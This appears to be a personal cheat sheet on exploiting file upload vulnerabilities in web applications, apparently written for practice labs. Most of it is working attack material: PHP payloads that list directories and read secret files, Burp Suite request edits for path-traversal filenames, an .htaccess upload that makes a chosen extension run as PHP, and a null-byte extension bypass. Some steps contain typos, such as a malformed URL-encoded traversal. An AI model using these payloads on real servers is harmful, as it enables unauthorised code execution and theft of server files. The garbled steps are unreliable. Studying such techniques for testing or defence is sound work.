--- ---

<h2>Important</h2>

Type of file upload Vulnerablity
```Terminal
- Overwriting
- Client Side Bypass
	- Bypass Filtering (HTML)
	- Changing Extension ---> (.php3, .php4, .php5, .php7, .phps, .php-s, ...)
- Server Side Bypass
	- Changing Extension ---> (.php3, .php4, .php5, .php7, .phps, .php-s, ...)
	- Magic Number       ---> 
```

---

<h2>Commands</h2>

Directory Infiltration (Client Side)
```
# List the directory
<?php echo implode("<br>",array_diff(scandir('/home/User_X/'),array('.','..'))); ?>

# List specific file
<?php echo file_get_contents('/home/User_X/secret'); ?>
```
- It is possisble to send the php into jpg and intercept the request with burpsuite (change the name of the file from  x.jpg to x.php)


Directory Infiltration using Path transversal (Client Side)
```
# Use Path Transversal to send the file to an other dir (Diff dir that allow execution code)
# Change the following in BurpSuite
try --> Content-Disposition: form-data; name="SOMETHING"; filename="../exploit.php"
URL Encode -->Content-Disposition: form-data; name="SOMETHING"; filename="..%2exploit.php"

# Make a request to the destination using ..%2
Visit the website x.com/files/SOMETHING/..%2fexploit.php
```
- Possible to use prior steps to bypass restriction on upload


Directory Infiltration (Server directive that mapp an arbitrary extension) --> Upload 2 files
```
# Verify the type of the server (Example: Apache, Nginx, Microsoft IIS, ...)
--> Send a POST request and check the result to identify the server (Or others ways)

# Verify the documentation on how to change/allow modifying the content type
# Will use Apache in the example

# Upload a JPG and change the request (filename: .htaccess / Content-Type = text/plain)
application/x-httpd-php .EXTENSION-DESIRED  ---> Include this under the file
# This will allow your code with the .EXTENSION-DESIRED to run has php

# Use the same request from the JPG upload and upload your php code (filename: X.EXTEN...)
<?php echo file_get_contents('/home/User/secret'); ?>

# Load the image on the browser or visit the URL display by the image
```
- Possible to use prior steps to bypass restriction on upload


Directory Infiltration # via obfuscated file extension
```
# Try uploading the enable file (Ex: jpg), intercept te request and modify the name
exploit.php%00.jpg      ---> Using null byte can allow you to bypass this
```
- Possible to use prior steps to bypass restriction on upload